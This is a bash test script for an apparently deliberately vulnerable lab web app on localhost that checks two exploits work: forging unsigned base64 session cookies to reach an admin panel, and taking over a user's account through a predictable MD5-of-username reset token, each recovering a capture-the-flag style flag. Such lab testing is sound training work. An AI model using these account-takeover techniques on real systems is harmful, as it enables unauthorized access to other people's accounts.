#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT

echo "[*] Waiting for API on port 5000..."
for i in $(seq 1 30); do
  nc -z -w2 127.0.0.1 5000 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 30 ]; then
    echo "[FAIL] API did not come up"
    $DC logs; exit 1
  fi
done
sleep 1

FAIL=0

# --- helper: forge a session cookie ---
forge_cookie() {
  python3 -c "
import base64, json, sys
data = json.dumps({'username': sys.argv[1], 'role': sys.argv[2]})
print(base64.b64encode(data.encode()).decode())
" "$1" "$2"
}

# --- Test 1: unsigned cookie manipulation -> flag1 ---
echo ""
echo "[*] Test 1 — unsigned cookie: forge admin session and access admin panel"

ADMIN_COOKIE=$(forge_cookie admin admin)
OUT=$(curl -sf http://127.0.0.1:5000/api/admin --cookie "session=$ADMIN_COOKIE")
if echo "$OUT" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d.get('flag1','').startswith('POC{') else 1)" 2>/dev/null; then
  FLAG1=$(echo "$OUT" | python3 -c "import json,sys; print(json.load(sys.stdin)['flag1'])")
  echo "[PASS] cookie manipulation: flag1 = $FLAG1"
else
  echo "[FAIL] cookie manipulation: $OUT"; FAIL=1
fi

echo "[*] Test 1b — regular user cookie returns 403"
USER_COOKIE=$(forge_cookie alice user)
CODE=$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:5000/api/admin --cookie "session=$USER_COOKIE")
if [ "$CODE" = "403" ]; then
  echo "[PASS] user role correctly blocked (403)"
else
  echo "[FAIL] expected 403, got $CODE"; FAIL=1
fi

# --- Test 2: predictable reset token -> flag2 ---
echo ""
echo "[*] Test 2 — predictable reset token: take over bob's account"

# Request bob's reset token
RESET_OUT=$(curl -sf http://127.0.0.1:5000/api/reset \
  -H 'Content-Type: application/json' -d '{"username":"bob"}')
TOKEN=$(echo "$RESET_OUT" | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

EXPECTED=$(python3 -c "import hashlib; print(hashlib.md5(b'bob').hexdigest())")
if [ "$TOKEN" = "$EXPECTED" ]; then
  echo "[PASS] token is predictable: MD5('bob') = $TOKEN"
else
  echo "[FAIL] unexpected token value: $TOKEN"; FAIL=1
fi

# Reset bob's password using the token
curl -sf http://127.0.0.1:5000/api/reset/confirm \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"bob\",\"token\":\"$TOKEN\",\"password\":\"pwned\"}" > /dev/null

# Confirm login succeeds with new password
LOGIN_CODE=$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' -d '{"username":"bob","password":"pwned"}')
if [ "$LOGIN_CODE" = "200" ]; then
  echo "[PASS] login as bob with new password succeeded"
else
  echo "[FAIL] login after reset returned $LOGIN_CODE"; FAIL=1
fi

# Access bob's profile (cookie format is known from test 1)
BOB_COOKIE=$(forge_cookie bob user)
OUT=$(curl -sf http://127.0.0.1:5000/api/profile --cookie "session=$BOB_COOKIE")
if echo "$OUT" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d.get('flag2','').startswith('POC{') else 1)" 2>/dev/null; then
  FLAG2=$(echo "$OUT" | python3 -c "import json,sys; print(json.load(sys.stdin)['flag2'])")
  echo "[PASS] bob profile: flag2 = $FLAG2"
else
  echo "[FAIL] bob profile: $OUT"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
